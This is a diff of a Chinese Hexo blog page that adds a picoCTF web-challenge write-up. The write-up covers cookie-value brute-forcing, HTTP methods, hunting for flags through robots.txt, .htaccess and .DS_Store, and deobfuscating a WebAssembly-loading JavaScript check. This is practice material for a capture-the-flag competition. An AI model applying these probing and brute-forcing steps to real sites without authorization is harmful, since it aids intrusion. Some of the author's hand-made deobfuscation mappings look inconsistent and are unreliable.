@@ -6,13 +6,17 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Hexo</title>
+  <title>picoctf刷题 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/page/6/index.html">
+  <meta name="description" content="cookies看提示是Welcome to my cookie search page. See how much I like different kinds of cookies!先抓包发现cookies的值为-1底下的框的内容是snickerdoodle，输入试试发现页面上显示I love snickerdoodle cookies!然后抓包发现cookie的值为0，猜测是爆破数字（只是加了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="picoctf刷题">
+<meta property="og:url" content="http://example.com/2022/01/16/picoctf%E5%88%B7%E9%A2%98/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="cookies看提示是Welcome to my cookie search page. See how much I like different kinds of cookies!先抓包发现cookies的值为-1底下的框的内容是snickerdoodle，输入试试发现页面上显示I love snickerdoodle cookies!然后抓包发现cookie的值为0，猜测是爆破数字（只是加了">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-01-16T10:03:03.000Z">
+<meta property="article:modified_time" content="2022-01-16T10:04:53.845Z">
 <meta property="article:author" content="ouroborosscr">
 <meta name="twitter:card" content="summary">
   
@@ -162,49 +166,76 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-个人令牌" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-picoctf刷题" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">git个人令牌</a>
+    <h1 class="article-title" itemprop="name">
+      picoctf刷题
     </h1>
   
 
         
         
 
+	<span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+		  <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+	</span>
 
-<a href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/" class="archive-article-date">
-  	<time datetime="2021-08-09T07:48:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-09</time>
+
+
+<a href="/2022/01/16/picoctf%E5%88%B7%E9%A2%98/" class="archive-article-date">
+  	<time datetime="2022-01-16T10:03:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-16</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <hr>
-<h2 id="关于2021年8月13日后git不接受账号密码修改的应对"><a href="#关于2021年8月13日后git不接受账号密码修改的应对" class="headerlink" title="关于2021年8月13日后git不接受账号密码修改的应对"></a>关于2021年8月13日后git不接受账号密码修改的应对</h2><p>今天上传博客的时候，<del>我在配置好ssh的情况下被要求输入账号和密码，并且</del>接到这样一条邮件——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">You recently used a password to access the repository at ouroborosscr&#x2F;ouroborosscr.github.io with git using git&#x2F;2.9.0.windows.1.</span><br><span class="line"></span><br><span class="line">Basic authentication using a password to Git is deprecated and will soon no longer work. Visit https:&#x2F;&#x2F;github.blog&#x2F;2020-12-15-token-authentication-requirements-for-git-operations&#x2F; for more information around suggested workarounds and removal dates.</span><br></pre></td></tr></table></figure>
-<p>意思是以后这种方法将会被弃用，<del>原来的ssh都会因此而作废，这就导致市面上大多数hexo的教程可能会因此失效（毕竟将无法上传）</del><br>根据建议打开网站——<a target="_blank" rel="noopener" href="https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/">https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/</a></p>
-<p>了解到需要“个人访问令牌”，那就顺着流程做——<a target="_blank" rel="noopener" href="https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token">https://docs.github.com/en/github/authenticating-to-github/keeping-your-account-and-data-secure/creating-a-personal-access-token</a></p>
-<p>其中，权限只选中repo就够了。</p>
-<p>跟着流程创建完之后，<code>git --verdion</code>检查一下自己git的版本，如果低于2.29，就下一个最新版安装——<a target="_blank" rel="noopener" href="https://github.com/git-for-windows/git/releases/tag/v2.32.0.windows.2">https://github.com/git-for-windows/git/releases/tag/v2.32.0.windows.2</a></p>
-<p>然后换https（这里只列举https，换git的方法差不多，但是这样的有一个好处是比ssh传输速度快很多），打开cmd（或git bush）输入git remote -v查看自己连接的库<br>如果报错，就是权限不够，先输一个git init，再输入<br>如果什么回显都没有，就是没有连接，直接输入<code>git remote add origin &quot;https://github.com/USERNAME/REPOSITORY.git&quot;</code><br>(记得改成自己的用户名和库名)<br>如果有类似</p>
-<figure class="highlight plain"><figcaption><span>git remote -v</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; origin  git@github.com:USERNAME&#x2F;REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  git@github.com:USERNAME&#x2F;REPOSITORY.git (push)</span><br></pre></td></tr></table></figure>
-<p>这样的回显，就输入<code>$ git remote set-url origin git@github.com:USERNAME/REPOSITORY.git</code>(记得改成自己的用户名和库名)</p>
-<p>然后输入git remote -v测试一下就行了<br>改后——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line"># Verify new remote URL</span><br><span class="line">&gt; origin  https:&#x2F;&#x2F;github.com&#x2F;USERNAME&#x2F;REPOSITORY.git (fetch)</span><br><span class="line">&gt; origin  https:&#x2F;&#x2F;github.com&#x2F;USERNAME&#x2F;REPOSITORY.git (push)</span><br></pre></td></tr></table></figure>
+        <p>cookies<br>看提示是Welcome to my cookie search page. See how much I like different kinds of cookies!<br>先抓包发现cookies的值为-1<br>底下的框的内容是snickerdoodle，输入试试<br>发现页面上显示I love snickerdoodle cookies!<br>然后抓包发现cookie的值为0，猜测是爆破数字（只是加了个重定向），然后爆破到18的时候出了flag</p>
+<p>GET aHEAD<br>又是文件协议，特容易被忽略<br>可使用协议如下：<br>GET： 请求指定的页面信息，并返回实体主体。<br>HEAD： 只请求页面的首部。<br>POST： 请求服务器接受所指定的文档作为对所标识的URI的新的从属实体。<br>PUT： 从客户端向服务器传送的数据取代指定的文档的内容。<br>DELETE： 请求服务器删除指定的页面。<br>OPTIONS： 允许客户端查看服务器的性能。<br>TRACE： 请求服务器在响应中的实体主体部分返回所得到的内容。<br>PATCH： 实体中包含一个表，表中说明与该URI所表示的原内容的区别。<br>MOVE： 请求服务器将指定的页面移至另一个网络地址。<br>COPY： 请求服务器将指定的页面拷贝至另一个网络地址<br>LINK： 请求服务器建立链接关系。<br>UNLINK： 断开链接关系。<br>WRAPPED： 允许客户端发送经过封装的请求。<br>Extension-mothed：在不改动协议的前提下，可增加另外的方法。</p>
+<p>Insp3ct0r<br>直接查看源代码，发现获得1/3的flag，然后提示这是html，三个分别在html，css，js中，直接打开上面的css，js，获得完整的flag</p>
+<p>Scavenger Hunt<br>方法和上一个差不多，只不过打开js发现是一句How can I keep Google from indexing my website?不是很理解应该怎么办，只能去扫目录，发现/robots.txt，/.DS_Store和/.htaccess/<br>出题人的意思应该是通过设置/robots.txt来阻止Google的索引，然后打开这个后提示I think this is an apache server… can you Access the next flag?<br>为了查看apache的配置而访问/.htaccess/，提示I love making websites on my Mac, I can Store a lot of information there.<br>然后通过mac的文件泄露联想到/.DS_Store，然后获取最后一部分flag</p>
+<p>Some Assembly Required 1<br>感觉就是闲的<br>打开以后是一个文本框，检查源代码看见一个js，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">const _0x402c&#x3D;[&#39;value&#39;,&#39;2wfTpTR&#39;,&#39;instantiate&#39;,&#39;275341bEPcme&#39;,&#39;innerHTML&#39;,&#39;1195047NznhZg&#39;,&#39;1qfevql&#39;,&#39;input&#39;,&#39;1699808QuoWhA&#39;,&#39;Correct!&#39;,&#39;check_flag&#39;,&#39;Incorrect!&#39;,&#39;.&#x2F;JIFxzHyW8W&#39;,&#39;23SMpAuA&#39;,&#39;802698XOMSrr&#39;,&#39;charCodeAt&#39;,&#39;474547vVoGDO&#39;,&#39;getElementById&#39;,&#39;instance&#39;,&#39;copy_char&#39;,&#39;43591XxcWUl&#39;,&#39;504454llVtzW&#39;,&#39;arrayBuffer&#39;,&#39;2NIQmVj&#39;,&#39;result&#39;];const _0x4e0e&#x3D;function(_0x553839,_0x53c021)&#123;_0x553839&#x3D;_0x553839-0x1d6;let _0x402c6f&#x3D;_0x402c[_0x553839];return _0x402c6f;&#125;;(function(_0x76dd13,_0x3dfcae)&#123;const _0x371ac6&#x3D;_0x4e0e;while(!![])&#123;try&#123;const _0x478583&#x3D;-parseInt(_0x371ac6(0x1eb))+parseInt(_0x371ac6(0x1ed))+-parseInt(_0x371ac6(0x1db))*-parseInt(_0x371ac6(0x1d9))+-parseInt(_0x371ac6(0x1e2))*-parseInt(_0x371ac6(0x1e3))+-parseInt(_0x371ac6(0x1de))*parseInt(_0x371ac6(0x1e0))+parseInt(_0x371ac6(0x1d8))*parseInt(_0x371ac6(0x1ea))+-parseInt(_0x371ac6(0x1e5));if(_0x478583&#x3D;&#x3D;&#x3D;_0x3dfcae)break;else _0x76dd13[&#39;push&#39;](_0x76dd13[&#39;shift&#39;]());&#125;catch(_0x41d31a)&#123;_0x76dd13[&#39;push&#39;](_0x76dd13[&#39;shift&#39;]());&#125;&#125;&#125;(_0x402c,0x994c3));let exports;(async()&#x3D;&gt;&#123;const _0x48c3be&#x3D;_0x4e0e;let _0x5f0229&#x3D;await fetch(_0x48c3be(0x1e9)),_0x1d99e9&#x3D;await WebAssembly[_0x48c3be(0x1df)](await _0x5f0229[_0x48c3be(0x1da)]()),_0x1f8628&#x3D;_0x1d99e9[_0x48c3be(0x1d6)];exports&#x3D;_0x1f8628[&#39;exports&#39;];&#125;)();function onButtonPress()&#123;const _0xa80748&#x3D;_0x4e0e;let _0x3761f8&#x3D;document[&#39;getElementById&#39;](_0xa80748(0x1e4))[_0xa80748(0x1dd)];for(let _0x16c626&#x3D;0x0;_0x16c626&lt;_0x3761f8[&#39;length&#39;];_0x16c626++)&#123;exports[_0xa80748(0x1d7)](_0x3761f8[_0xa80748(0x1ec)](_0x16c626),_0x16c626);&#125;exports[&#39;copy_char&#39;](0x0,_0x3761f8[&#39;length&#39;]),exports[_0xa80748(0x1e7)]()&#x3D;&#x3D;0x1?document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)]&#x3D;_0xa80748(0x1e6):document[_0xa80748(0x1ee)](_0xa80748(0x1dc))[_0xa80748(0x1e1)]&#x3D;_0xa80748(0x1e8);&#125;</span><br><span class="line">先进行简单的分割，以及把正经的16进制转换出来以便于阅读（因为_0x4e0e这个函数过于常见，所以一起换掉）：（sublime超级好用的js排版插件https:&#x2F;&#x2F;blog.csdn.net&#x2F;waterdemo&#x2F;article&#x2F;details&#x2F;38110863）</span><br><span class="line">const _0x402c &#x3D; [&quot;value&quot;, &quot;2wfTpTR&quot;, &quot;instantiate&quot;, &quot;275341bEPcme&quot;, &quot;innerHTML&quot;, &quot;1195047NznhZg&quot;, &quot;1qfevql&quot;, &quot;input&quot;, &quot;1699808QuoWhA&quot;, &quot;Correct!&quot;, &quot;check_flag&quot;, &quot;Incorrect!&quot;, &quot;.&#x2F;JIFxzHyW8W&quot;, &quot;23SMpAuA&quot;, &quot;802698XOMSrr&quot;, &quot;charCodeAt&quot;, &quot;474547vVoGDO&quot;, &quot;getElementById&quot;, &quot;instance&quot;, &quot;copy_char&quot;, &quot;43591XxcWUl&quot;, &quot;504454llVtzW&quot;, &quot;arrayBuffer&quot;, &quot;2NIQmVj&quot;, &quot;result&quot;];</span><br><span class="line">const _0x4e0e &#x3D; function(url, whensCollection) &#123;</span><br><span class="line">  &#x2F;** @type &#123;number&#125; *&#x2F;</span><br><span class="line">  url &#x3D; url - 470;</span><br><span class="line">  let _0x402c6f &#x3D; _0x402c[url];</span><br><span class="line">  return _0x402c6f;</span><br><span class="line">&#125;;</span><br><span class="line">(function(data, oldPassword) &#123;</span><br><span class="line">  const toMonths &#x3D; _0x4e0e;</span><br><span class="line">  for (; !![];) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      const userPsd &#x3D; -parseInt(toMonths(491)) + parseInt(toMonths(493)) + -parseInt(toMonths(475)) * -parseInt(toMonths(473)) + -parseInt(toMonths(482)) * -parseInt(toMonths(483)) + -parseInt(toMonths(478)) * parseInt(toMonths(480)) + parseInt(toMonths(472)) * parseInt(toMonths(490)) + -parseInt(toMonths(485));</span><br><span class="line">      if (userPsd &#x3D;&#x3D;&#x3D; oldPassword) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        data[&quot;push&quot;](data[&quot;shift&quot;]());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (_0x41d31a) &#123;</span><br><span class="line">      data[&quot;push&quot;](data[&quot;shift&quot;]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(_0x402c, 627907);</span><br><span class="line">let exports;</span><br><span class="line">(async() &#x3D;&gt; &#123;</span><br><span class="line">  const findMiddlePosition &#x3D; _0x4e0e;</span><br><span class="line">  let leftBranch &#x3D; await fetch(findMiddlePosition(489));</span><br><span class="line">  let rightBranch &#x3D; await WebAssembly[findMiddlePosition(479)](await leftBranch[findMiddlePosition(474)]());</span><br><span class="line">  let module &#x3D; rightBranch[findMiddlePosition(470)];</span><br><span class="line">  exports &#x3D; module[&quot;exports&quot;];</span><br><span class="line">&#125;)();</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @return &#123;undefined&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">function onButtonPress() &#123;</span><br><span class="line">  const navigatePop &#x3D; _0x4e0e;</span><br><span class="line">  let params &#x3D; document[&quot;getElementById&quot;](navigatePop(484))[navigatePop(477)];</span><br><span class="line">  for (let i &#x3D; 0; i &lt; params[&quot;length&quot;]; i++) &#123;</span><br><span class="line">    exports[navigatePop(471)](params[navigatePop(492)](i), i);</span><br><span class="line">  &#125;</span><br><span class="line">  exports[&quot;copy_char&quot;](0, params[&quot;length&quot;]);</span><br><span class="line">  if (exports[navigatePop(487)]() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">    document[navigatePop(494)](navigatePop(476))[navigatePop(481)] &#x3D; navigatePop(486);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    document[navigatePop(494)](navigatePop(476))[navigatePop(481)] &#x3D; navigatePop(488);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
+<p>然后很容易发现，文本框调用了onButtonPress()函数，所以直接追这个函数就行<br>发现调用了大量的_0x4e0e函数（navigatePop）<br>阅读代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const _0x4e0e &#x3D; function(url, whensCollection) &#123;</span><br><span class="line">  &#x2F;** @type &#123;number&#125; *&#x2F;</span><br><span class="line">  url &#x3D; url - 470;</span><br><span class="line">  let _0x402c6f &#x3D; _0x402c[url];</span><br><span class="line">  return _0x402c6f;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>发现，逻辑是读取一个数字，减去470后在前面的_0x402c取字符串<br>所以导出对应关系：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">_0x4e0e(470)&#x3D;value</span><br><span class="line">&#39;value&#39; 470</span><br><span class="line">&#39;2wfTpTR&#39; 471</span><br><span class="line">&#39;instantiate&#39; 472</span><br><span class="line">&#39;275341bEPcme&#39; 473</span><br><span class="line">&#39;innerHTML&#39; 474</span><br><span class="line">&#39;1195047NznhZg&#39; 475</span><br><span class="line">&#39;1qfevql&#39; 476</span><br><span class="line">&#39;input&#39; 477</span><br><span class="line">&#39;1699808QuoWhA&#39; 478</span><br><span class="line">&#39;Correct!&#39; 479</span><br><span class="line">&#39;check_flag&#39; 480</span><br><span class="line">&#39;Incorrect!&#39; 481</span><br><span class="line">&#39;.&#x2F;JIFxzHyW8W&#39; 482</span><br><span class="line">&#39;23SMpAuA&#39; 483</span><br><span class="line">&#39;802698XOMSrr&#39; 484</span><br><span class="line">&#39;charCodeAt&#39; 485</span><br><span class="line">&#39;474547vVoGDO&#39; 486 </span><br><span class="line">&#39;getElementById&#39; 487</span><br><span class="line">&#39;instance&#39; 488</span><br><span class="line">&#39;copy_char&#39; 489</span><br><span class="line">&#39;43591XxcWUl&#39; 490</span><br><span class="line">&#39;504454llVtzW&#39; 491</span><br><span class="line">&#39;arrayBuffer&#39; 492</span><br><span class="line">&#39;2NIQmVj&#39; 493</span><br><span class="line">&#39;result&#39; 494</span><br><span class="line">然后是会先调用function(data, oldPassword)函数，对上面的数组进行打乱：</span><br><span class="line">函数内容为：</span><br><span class="line">(function(data, oldPassword) &#123;</span><br><span class="line">  const toMonths &#x3D; _0x4e0e;</span><br><span class="line">  for (; !![];) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      const userPsd &#x3D; -parseInt(&#39;504454llVtzW&#39;) + parseInt(&#39;2NIQmVj&#39;) + -parseInt(&#39;1195047NznhZg&#39;) * -parseInt(&#39;275341bEPcme&#39;) + -parseInt(&#39;.&#x2F;JIFxzHyW8W&#39;) * </span><br><span class="line">-parseInt(&#39;23SMpAuA&#39;) + -parseInt(&#39;1699808QuoWhA&#39;) * parseInt(&#39;check_flag&#39;) + parseInt(&#39;instantiate&#39;) * parseInt(&#39;43591XxcWUl&#39;) + -parseInt(&#39;charCodeAt&#39;);</span><br><span class="line">      if (userPsd &#x3D;&#x3D;&#x3D; oldPassword) &#123;</span><br><span class="line">        break;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        data[&quot;push&quot;](data[&quot;shift&quot;]());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; catch (_0x41d31a) &#123;</span><br><span class="line">      data[&quot;push&quot;](data[&quot;shift&quot;]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(_0x402c, 627907);</span><br></pre></td></tr></table></figure>
+<p>其中parseInt函数的作用是把字符串解析成数字：<a target="_blank" rel="noopener" href="https://www.runoob.com/jsref/jsref-parseint.html">https://www.runoob.com/jsref/jsref-parseint.html</a><br>懒得手算，所以转换成JavaScript打印出转换的值，加入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var arr &#x3D; str.split(&quot; &quot;);</span><br><span class="line">for(var key in _0x402c)&#123;</span><br><span class="line"> document.writeln(arr[key]);</span><br></pre></td></tr></table></figure>
 
-<p>之后在运行hexo d 的时候，明显传输速度直线上升</p>
-<p>后来发现，也可能是因为我原来用ssh传输太慢，可能某次修改的时候，把原来的ssh的库给换掉了，其实直接<code>git remote add origin &quot;git@github.com:USERNAME/REPOSITORY.git&quot;</code>也可以换回ssh，也能应付这种情况，但是问题是速度是真的慢，和被墙了一样</p>
+
+<p>完善onButtonPress()函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(async() &#x3D;&gt; &#123;</span><br><span class="line">  const findMiddlePosition &#x3D; _0x4e0e;</span><br><span class="line">  let leftBranch &#x3D; await fetch(&quot;.&#x2F;JIFxzHyW8W&quot;);</span><br><span class="line">  let rightBranch &#x3D; await WebAssembly[&quot;instantiate&quot;](await leftBranch[&quot;arrayBuffer&quot;]());</span><br><span class="line">  let module &#x3D; rightBranch[&quot;instance&quot;];</span><br><span class="line">  exports &#x3D; module[&quot;exports&quot;];</span><br><span class="line">&#125;)();</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @return &#123;undefined&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">function onButtonPress() &#123;</span><br><span class="line">  const navigatePop &#x3D; _0x4e0e;</span><br><span class="line">  let params &#x3D; document[&quot;getElementById&quot;](&quot;input&quot;)[&quot;value&quot;];</span><br><span class="line">  for (let i &#x3D; 0; i &lt; params[&quot;length&quot;]; i++) &#123;</span><br><span class="line">    exports[&quot;copy_char&quot;](params[&quot;charCodeAt&quot;](i), i);</span><br><span class="line">  &#125;</span><br><span class="line">  exports[&quot;copy_char&quot;](0, params[&quot;length&quot;]);</span><br><span class="line">  if (exports[&quot;check_flag&quot;]() &#x3D;&#x3D; 1) &#123;</span><br><span class="line">    document[&quot;getElementById&quot;](&quot;result&quot;)[&quot;innerHTML&quot;] &#x3D; &quot;Correct!&quot;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    document[&quot;getElementById&quot;](&quot;result&quot;)[&quot;innerHTML&quot;] &#x3D; &quot;Incorrect!&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>然后我们发现：没什么卵用。<br>无非就是输对了代码以后会显示correct，输错了会显示incorrect<br>然后回去看题目，提到了Assembly，也就是混淆这玩意的东西，所以可能是让我们找混淆这玩意的代码，直接F12,调到source，发现有个wasm，那就是代码的混淆规则，在最后找到了flag</p>
+<p>实际上：因为那一大堆字符串里面只有一个./JIFxzHyW8W像路径，按路径去试的话，一下子就出来了</p>
 
       
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
       
     </div>
     <div class="article-info article-info-index">
@@ -213,16 +244,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/09/%E4%B8%AA%E4%BA%BA%E4%BB%A4%E7%89%8C/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/01/16/picoctf%E5%88%B7%E9%A2%98/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/01/16/pte%E5%9F%B9%E8%AE%AD/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pte培训</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -241,6 +331,16 @@
 </aside>
 
 
+
+  
+  
+  
+
+  
+
+  
+
+  
 
 
     <section id="comments" style="margin:10px;padding:10px;background:#fff;">
@@ -265,852 +365,6 @@
 
     </section>
   
-  
-    <article id="post-xman2021-easyphp" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/08/xman2021-easyphp/">xman2021-easyphp</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/08/08/xman2021-easyphp/" class="archive-article-date">
-  	<time datetime="2021-08-08T12:15:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>dasctf的原题,就改了一下文件结构和类名</p>
-<p>源码——</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class XMAN&#123;</span><br><span class="line">    public $class;</span><br><span class="line">    public 